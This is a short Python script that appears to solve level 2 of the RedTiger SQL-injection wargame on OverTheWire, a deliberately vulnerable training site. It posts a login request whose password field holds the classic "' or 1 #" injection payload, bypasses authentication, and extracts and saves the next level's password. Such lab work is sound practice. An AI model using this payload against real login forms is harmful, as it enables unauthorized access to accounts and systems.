#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Simple sqli injection

    Target: Login
    Hint: Condition
    '''
    url = "https://redtiger.labs.overthewire.org/level2.php"
    pass_r = 'The password for the next level is: '
    level = 'level2login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level2login=cooks[level])

    # Injection
    param = dict(username='1', password="' or 1 #", login="Login")
    response = req.post_request(url, param, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
